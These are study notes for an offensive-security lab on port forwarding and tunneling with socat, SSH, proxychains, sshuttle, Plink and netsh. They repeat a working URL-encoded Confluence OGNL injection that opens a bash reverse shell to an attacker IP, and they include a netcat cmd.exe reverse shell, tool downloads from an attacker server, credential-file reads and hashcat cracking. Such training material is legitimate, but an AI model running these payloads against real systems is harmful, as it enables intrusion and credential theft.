- Getting through *Firewalls* and *Deep Packet Inspection*
	- *Port redirection*
		- (i.e various types of *port forwarding*)
		- means modifying the flow of data so that packets sent to one _socket_ will be taken and passed to another socket
	- *Tunneling*
		- means  encapsulating one type of data stream within another, for example, transporting _Hypertext Transfer Protocol_ (HTTP) traffic within a _Secure Shell_ (SSH) connection (so from an external perspective, only the SSH traffic will be visible).

# Port Forwarding with Linux Tools

- Port Forwarding
	- we configure a host to listen on one port and relay all packets received on that port to another destination

### A Simple Port Forwarding Scenario
- Example:
	- Exploit POC:
		- ```curl -v http://10.0.0.28:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/10.0.0.28/1270%200%3E%261%27%29.start%28%29%22%29%7D/```
		- URL decode
			- Burp (or)
			- CyberChef
		- ```/${new javax.script.ScriptEngineManager().getEngineByName("nashorn").eval("new java.lang.ProcessBuilder().command('bash','-c','bash -i >& /dev/tcp/10.0.0.28/1270 0>&1').start()")}/```
			- OGNL injection paylods
			- OGNL = Object-Graph Notation Language
				- used in Java apps
				- happens when weak sanitization
			- this paylods needs partly un-encoded (.,-,/)
		- obtained reverse shell
		- ```ip addr```
			- check network interfaces
		- ```ip route```
			- check routes
		- finding confluence config file & finding Postgres DB IP and port in file
			- ```cat /var/atlassian/application-data/confluence/confluence.cfg.xml```
		D@t4basePassw0rd!
- port fowarding to acces Postgre SQL on DMZ'd host
![[Pasted image 20240120131336.png]]
### Port Forwarding with Socat

- *Socat*
	- networking tool
	- usually not installed
		- possible to download and run a statically-linked binary version
	- Example:```socat -ddd TCP-LISTEN:2345,fork TCP:10.4.199.215:5432```
		- -ddd = verbose
		- fork = new subprocess
		- forwarding listening host port (TCP-LISTEN) traffic to TGT port (TCP:)
- network is now set up like this:
![[Pasted image 20240120132128.png]]

- Run *psql* (postgres sql)
	- [kali]```psql -h 192.168.50.63 -p 2345 -U postgres```
		- -h = host
		- -p = port
		- -U = postgres user account
- Once connected
	- ```\l```
		- list available databases
	- ```\dt```
		- list avail tables
	- ```\?```
- query *cwd_user* table
	- ```\c confluence```
		- connect to db
	- ```select * from cwd_user;```
		- query
- crack password hashes
	- ```hashcat -m 12001 hashes.txt /usr/share/wordlists/fasttrack.txt ```
		- -m 12001 = Atlassian hash
		- fasttrack.txt = wordlist
- kill old Socat -> create new one to forward port traffic to ssh server
	- ```socat TCP-LISTEN:2222,fork TCP:10.4.199.215:22```

- Network looks like this now:
	![[Pasted image 20240120133153.png]]

- SSH to port 2222 on CONFLUENCE01
	- ```ssh database_admin@192.168.199.63 -p2222```

- Socat Alternatives:
	- *rinetd*
		- runs as a daemon
		- better solution for long-term port forwarding
		- unwieldy for temp port forwarding
	- *Netcat* and a FIFO named pipe
	- *iptables* (requires root)
		- To be able to forward packets in Linux also requires enabling forwarding on the interface we want to forward on by writing **"1"** to **/proc/sys/net/ipv4/conf/[interface]/forwarding** (if it's not already configured to allow it)

# SSH Tunneling

- OpenSSH - tunneling tool
	- Can be found on Windows
- *SSH port forwarding*
	- tunneling data through an SSH connection
### SSH Local Port Forwarding
	- Packets are not forwarded by the same host that listens for packets.
	- Instead, an SSH connection is made between two hosts (an SSH client and an SSH server), a listening port is opened by the SSH client, and all packets received on this port are tunneled through the SSH connection to the SSH server. The packets are then forwarded by the SSH server to the socket we specify.

![[Pasted image 20240120184306.png]]

	- In this type of scenario, we'll plan to create an SSH local port forward as part of our SSH connection from CONFLUENCE01 to PGDATABASE01. We will bind a listening port on the WAN interface of CONFLUENCE01. All packets sent to that port will be forwarded through the SSH tunnel. PGDATABASE01 will then forward these packets toward the SMB port on the new host we found.

Example:
	- Need to know exact IP and port for SSH local port forward
- curl one-liner for rev shell (Lab set-up) - CONFLUENCE01
	- ```curl http://192.168.226.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.64.3/5555%200%3E%261%27%29.start%28%29%22%29%7D/```
- make sure we have TTY functionality using Python3 *pty* module
	- ```python3 -c 'import pty; pty.spawn("/bin/bash")'```
		- or
	- ```python3 -c 'import pty; pty.spawn("/bin/sh")'```
- ssh into PGDATABASE01
	- ```ssh database_admin@10.4.50.215```
		- pass = sqlpass123
- enumerate
	- ```ip addr```
- discover subnets
	- ```ip route```
- Bash for loop using Netcat to sweep for hosts with an open port 445 on /24 subnet
	- ```for i in $(seq 1 254); do nc -zv -w 1 172.16.50.$i 445; done```
		- -z = check for listening port w/out sending data
		- -v = verbose
		- -w = 1 = lower time-out threshold
- SSH Local Port Forward
	- ```ssh -N -L 0.0.0.0:4455:172.16.225.217:4242 database_admin@10.4.225.215```
		- -L = OpenSSH's port forwarding
			- format = IP:PORT:IP:PORT
				- listening ip & port : tgt ip & port
		- -N = prevent a shell from being opened
		- -v = to debug
			- if fails we wont know unless -v option
- Curl one-liner to catch another rev shell
- confirm ssh process is working
	- ```ss -ntplu```

![[Pasted image 20240120192318.png]]

- Since working, enumerate SMB
	- ```smbclient -p 4455 -L //192.168.50.63/ -U hr_admin --password=Welcome1234```
		- -L = list available shares
		- -p = port
		- -U = usersname
		- --password = password
- enumerate **scripts** SMB share
	- ```smbclient -p 4455 //192.168.225.63/scripts -U hr_admin --password=Welcome1234```
	- ```ls```
	- ```get Provissioning.ps1```

- *rustc*
	- run rust scripts
	- rustc [file]
### SSH Dynamic Port Forwarding
	- single listening port on the SSH client, packets can be forwarded to any socket that the SSH server host has access to
- SSH Client creates a SOCKS proxy server port
	- SOCKS is a proxying protocol
		- a SOCKS server accepts packets (with a SOCKS protocol header) and forwards them on to wherever they're addressed
	- **[must have SOCK-compatible client software]**
	- **[must be in correct SOCKS protocol format]**

 ![[Pasted image 20240120212928.png]]

- Example:
	- confluence exploit:
		- ```curl http://192.168.239.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.210/4444%200%3E%261%27%29.start%28%29%22%29%7D/```
	- TTY shell
		- ```python3 -c 'import pty; pty.spawn("/bin/bash")'```
	- Dynamic Port Forwarding
		- ```ssh -N -D 0.0.0.0:9999 database_admin@10.4.225.215```
			- -D = Dynamic
	- SMBClient doesn't have SOCKS proxy option

	- *Proxychains*
		- forces network traffic from third party tools over HTTP or SOCKS proxies.
			- can be used in a chain
			- ```It uses the Linux shared object preloading technique (LD_PRELOAD) to hook _libc_ networking functions within the binary that gets passed to it, and forces all connections over the configured proxy server. This means it might not work for everything, but will work for most _dynamically-linked binaries_ that perform simple network operations. It won't work on _statically-linked binaries_.```
		- Uses config file
			- stored by default:
				- **/etc/proxychains4.conf**
			- by default, proxies defined at EOF
		- Edit config file to locate SOCKS proxy port & confirm it is SOCKS
		- proxy type, IP address, and port
			- (i.e.) **socks5 192.168.50.63 9999**
				- ```Although we specify _socks5_ in this example, it could also be _socks4_, since SSH supports both. SOCKS5 supports authentication, IPv6, and _User Datagram Protocol_ (UDP), including DNS. Some SOCKS proxies will only support the SOCKS4 protocol. Make sure you check which version is supported by the SOCKS server when using SOCKS proxies in engagements.```
		- Proxychains will read the config file, hook into the smbclient process, and force all traffic through the SOCKS proxy
			- ```proxychains smbclient -L //172.16.225.217/ -U hr_admin --password=Welcome1234```
					- As if we're on the SSH server
				- proxychains = read proxy config file
		- Port scan and push all packets through the SSH dynamic port forward SOCKS proxy
				- ```proxychains nmap -vvv -sT --top-ports=20 -Pn 172.16.225.217```
					- Pn = skip host discov
					- n = no DNS resoultion
		- Can lower timeout to speed up scans
			- Lowering the **tcp_read_time_out** and **tcp_connect_time_out** values in the Proxychains configuration file
				- (500-1000)

### SSH Remote Port Forwarding
	- In a similar way that an attacker may execute a remote shell payload to connect back to an attacker-controlled listener, SSH remote port forwarding can be used to connect back to an attacker-controlled SSH server, and bind the listening port there
	- in remote port forwarding, the listening port is bound to the SSH server. Instead of the packet forwarding being done by the SSH server, in remote port forwarding, packets are forwarded by the SSH client.

![[Pasted image 20240121133021.png]]

	- We can connect from CONFLUENCE01 to our Kali machine over SSH. The listening TCP port 2345 is bound to the loopback interface on our Kali machine. Packets sent to this port are pushed by the Kali SSH server software through the SSH tunnel back to the SSH client on CONFLUENCE01. They are then forwarded to the PostgreSQL database port on PGDATABASE01.

- Example:
	- Enable SSH server on kali
		- ```sudo systemctl start ssh```
	- check if SSH port is open and working
		- ```sudo ss -ntplu```
	- TTY shell
		- ```python3 -c 'import pty; pty.spawn("/bin/sh")'```
	- Create SSH remote port forward
			- may have to explicity allow password-based authentification
				- Setting **PasswordAuthentication** to **yes** in **/etc/ssh/sshd_config**
		- ```ssh -N -R 127.0.0.1:4444:10.4.209.215:4444 kali@192.168.45.186```
			- -R = remote
			- -N = no shell being opened
	- confirm
		- ```ss -ntplu```

![[Pasted image 20240121134105.png]]

- Enumerate Postgres server on the loopback interface of our Kali
	- ```psql -h 127.0.0.1 -p 2345 -U postgres```
	- ```\l```

### SSH Remote Dynamic Port Forwarding
	- creates a dynamic port forward  in the remote configuration. The SOCKS proxy port is bound to the SSH server, and traffic is forwarded from the SSH client.

![[Pasted image 20240121180749.png]]

	- Remote dynamic port forwarding has only been available since October 2017's OpenSSH 7.6. Despite this, only the OpenSSH _client_ needs to be version 7.6 or above to use it - the server version doesn't matter.

##### New scenario
	- This time we find a Windows server (MULTISERVER03) on the DMZ network. The firewall prevents us from connecting to any port on MULTISERVER03, or any port other than TCP/8090 on CONFLUENCE01 from our Kali machine. But we can SSH _out_ from CONFLUENCE01 _to our Kali machine_, then create a remote dynamic port forward so we can start enumerating MULTISERVER03 from Kali.

![[Pasted image 20240121181834.png]]

	- The SSH session is initiated from CONFLUENCE01, connecting to the Kali machine, which is running an SSH server. The SOCKS proxy port is then bound to the Kali machine on TCP/9998. Packets sent to that port will be pushed back through the SSH tunnel to CONFLUENCE01, where they will be forwarded based on where they're addressed - in this case, MULTISERVER03.

- conluence exploit:
	- ```curl http://192.168.200.63:8090/%24%7Bnew%20javax.script.ScriptEngineManager%28%29.getEngineByName%28%22nashorn%22%29.eval%28%22new%20java.lang.ProcessBuilder%28%29.command%28%27bash%27%2C%27-c%27%2C%27bash%20-i%20%3E%26%20/dev/tcp/192.168.45.187/1234%200%3E%261%27%29.start%28%29%22%29%7D/```
- TTY shell
	- ```python3 -c 'import pty; pty.spawn("/bin/sh")'```
- Remote dynamic port fowarding
	- only need to pass SSH server listening socket
		- By default, bound to the loopback interface of the SSH server
	- ```ssh -N -R 9998 kali@192.168.45.186```
		- -R 9998 = SOCKS proxy port
- confirm
	- ```sudo ss -ntplu```
- edit proxychain config file
	- ```socks5 127.0.0.1 9998```
- run nmap with proxychains against MULTISERVER03
	- ```proxychains nmap -vvv -sT -p 9000-9100 -Pn -n 10.4.225.215```

[kill process on a port]
	- fuser -k -SIGTERM 4444/tcp
[invoke x86 code on ARM]
	- qemu-x86_x64-static [file]

### Using sshuttle
- sshuttle
	- turns an SSH connection into something similar to a VPN by setting up local routes that force traffic through the SSH tunnel.
	- [requires root ] on SSH Client
	- [requires python3] on SSH server

	- Example:
		- port forward in a shell on CONFLUENCE01, listening on port 2222 on the WAN interface and forwarding to port 22 on PGDATABASE01.
			- ```socat TCP-LISTEN:2222,fork TCP:10.4.50.215:22```
		- run **sshuttle** while specifying subnets we want to tunnel through this connection
			- ```sshuttle -r database_admin@192.168.50.63:2222 10.4.50.0/24 172.16.50.0/24```
		- connect to the SMB share on HRSHARES
			- ```smbclient -L //172.16.50.217/ -U hr_admin --password=Welcome1234```

### Port Forwarding with Windows Tools

### ssh.exe

- Different ssh tools
	- **scp.exe**, **sftp.exe**, **ssh.exe**, along with other **ssh-***
- DefualtLocation:
	- ```%systemdrive%\Windows\System32\OpenSSH```

Example:
	- ```creating a remote dynamic port forward from MULTISERVER03 (a Windows machine) to our Kali machine. In this scenario, only the RDP port is open on MULTISERVER03. We can RDP in, but we can't bind any other ports to the WAN interface. Once we have our lab set up, it should appear as so:```

![[Pasted image 20240121195125.png]]

- Start SSH server
	- ```sudo systemctl start ssh```
- RDP into MULTISERVER03
	- ```xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.50.64```
- Determine if SSH is on the box
	- ```where ssh```
- Determin SSH version
	- ```ssh.exe -V```
	- OpenSSH version bundled with Winows is > 7.6
		- can use it for remote dynamic port forwarding
- create remote dynamic port forward to Kali machine
	- ```ssh -N -R 9998 tristan@192.168.45.187```
- confirm
	- ```ss -ntplu```
- update proxychain config
	- ```socks5 127.0.0.1 9998```
- connect to PostgreSQL server
	- ```proxychains psql -h 10.4.50.215 -U postgres```

### Plink
	-in case there is no OpenSSH client
	- CLI Putty
	- rarely flagged
	- does not have remote dynamic port forwarding

![[Pasted image 20240123210855.png]]

	-MULTISERVER03 is already "pre-compromised" in the lab. Already has webshell on :80

- Example:
	- host Apache2 on Kali to download nc.exe on MULTISERVER03
		- ```sudo systemctl start apache2```
	- find **nc.exe** from our Kali **windows-resources/binaries** directory and copy it to the Apache2 web root.
		- ```find / -name nc.exe 2>/dev/null```
		- ```sudo cp /usr/share/windows-resources/binaries/nc.exe /var/www/html/```
	- use a _PowerShell_ _wget_ one-liner from the web shell to download **nc.exe** from out Kali
		- ```powershell wget -Uri http://192.168.118.4/nc.exe -OutFile C:\Windows\Temp\nc.exe```
	- start listener
		- ```nc -lvnp 4446```
	- from windows tgt, execute nc and throw shell
		- ```C:\Windows\Temp\nc.exe -e cmd.exe 192.168.45.187 4446```
	- download Plink to MULTISERVER03
		- ```find / -name plink.exe 2>/dev/null```
		- ```sudo cp /usr/share/windows-resources/binaries/plink.exe /var/www/html/```
	- use the PowerShell one-liner to download **plink.exe** from our Kali
		- ```powershell wget -Uri http://192.168.45.187/plink.exe -OutFile C:\Windows\Temp\plink.exe```
	- set up Plink with a remote port forward so that we can access the MULTISERVER03 RDP port from our Kali
		- ```C:\Windows\Temp\plink.exe -ssh -l kali -pw $FEbruary1496$ -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.187```
				- [This might log our Kali password somewhere undesirable! If we're in a hostile network, we may wish to create a port-forwarding only user on our Kali machine for remote port forwarding situations.]
			- After the **-R** option, we'll pass the socket we want to open on the Kali SSH server, and the RDP server port on the loopback interface of MULTISERVER03 that we want to forward packets to.
			- -l = username
			- -pw = password
------------------------------------------------------------->
	- [We are presented with a prompt asking if we want to store the server key in the cache.] <------------------------------------------------------------------
		- not possible to accept the SSH client key chache prompt non-tty shell on linux
		- can use:
			- **cmd.exe /c echo y**
			- full example:
				- ```cmd.exe /c echo y | C:\Windows\Temp\plink.exe -ssh -l kali -pw $FEbruary1496$ -R 127.0.0.1:9833:127.0.0.1:3389 192.168.45.187```
	- confirm port has opened on Kali
		- ```ss -ntplu```

![[Pasted image 20240123212934.png]]

- RDP into tgt machine
	- ```xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:127.0.0.1:9833```

### Netsh
	-native windows 
	-requires admin priv to create port forward on Windows
	
- Network Shell
- Port Forward
		-requires admin priv or UAC
	- *portproxy*
	- *subcontext*

![[Pasted image 20240123214926.png]]

- Example:
	- RDP directly into MULTISERVER03 from our Kali
		- ```xfreerdp /u:rdp_admin /p:P@ssw0rd! /v:192.168.200.64
	- Open Admin cmd.exe
	- Set up **netsh**
		- ```netsh interface portproxy add v4tov4 listenport=4545 listenaddress=192.168.200.64 connectport=4545 connectaddress=10.4.200.215```
			- **netsh interface** **portproxy** **add** =  add portproxy rule
			-  (**v4tov4**) = IPv4 listener that is forwarded to an IPv4 port
			- This will listen on port 2222 on the external-facing interface (**listenport=2222 listenaddress=192.168.50.64**)
			- forward packets to port 22 on PGDATABASE01 (**connectport=22 connectaddress=10.4.50.215**).
	- confirm on tgt
		- ```netstat -anp TCP | find "4545"```
	- confirm on tgt v2
		- ```netsh interface portproxy show all```
	- ![[Pasted image 20240123215955.png]]

	- Blocked by Firewall
		- ![[Pasted image 20240123220116.png]]
	- Poke a hole in the firewall ([remember to plug the hole after])
	- Use the **netsh advfirewall firewall** subcontext to create the holeand **add rule** command
		- ```netsh advfirewall firewall add rule name="port_forward_ssh_4545" protocol=TCP dir=in localip=192.168.200.64 localport=4545 action=allow```
		- dir=in --> incoming traffic
	- SSH to port 2222 on MULTISERVER03, as though connecting to port 22 on PGDATABASE01.
		- ```ssh database_admin@192.168.200.64 -p4545```

![[Pasted image 20240123220620.png]]

- [Delete firewall rule]
	- Using **netsh advfirewall firewall**, we can **delete** the rule by *name*
		- ```netsh advfirewall firewall delete rule name="port_forward_ssh_4545"```
- Delete port forward by *context*
	- ```netsh interface portproxy del v4tov4 listenport=4545 listenaddress=192.168.200.64```
- Alternative Windows Firewall  PowerShell Cmdlets
	- _NetFirewallRule_ and _Disable-NetFirewallRule_.

